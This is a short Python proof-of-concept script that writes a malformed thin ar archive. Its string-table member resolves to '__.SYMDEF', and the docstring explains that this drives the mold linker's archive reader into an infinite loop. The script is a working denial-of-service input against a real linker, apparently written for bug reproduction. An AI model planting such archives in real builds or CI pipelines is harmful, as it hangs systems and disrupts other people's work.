#!/usr/bin/env python3
"""Writes a malformed Unix thin archive ("!<thin>\\n") whose only real member resolves, via the
SysV long-filename convention, to the literal name "__.SYMDEF" - the BSD symbol-table pseudo-member
name. mold's read_thin_archive_members() `continue`s on this name BEFORE advancing its `data`
cursor (that only happens at the very end of the loop body, on the path this `continue` skips),
so the loop parses the exact same header forever: an infinite loop / hang (100% CPU, never
terminates) rather than a crash."""
import sys


def ar_header(name: str, size: int) -> bytes:
    name = name.ljust(16)[:16]
    date = b"0".ljust(12)
    uid = b"0".ljust(6)
    gid = b"0".ljust(6)
    mode = b"0".ljust(8)
    sz = str(size).ljust(10)
    fmag = b"`\n"
    h = name.encode() + date + uid + gid + mode + sz.encode() + fmag
    assert len(h) == 60
    return h


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.a"
    strtab_content = b"__.SYMDEF/\n"

    out = b"!<thin>\n"
    out += ar_header("// ", len(strtab_content))  # string table member
    out += strtab_content
    if len(out) % 2:
        out += b"\n"
    out += ar_header("/0", 0)  # SysV long name -> resolves to "__.SYMDEF"

    with open(out_path, "wb") as f:
        f.write(out)


if __name__ == "__main__":
    main()
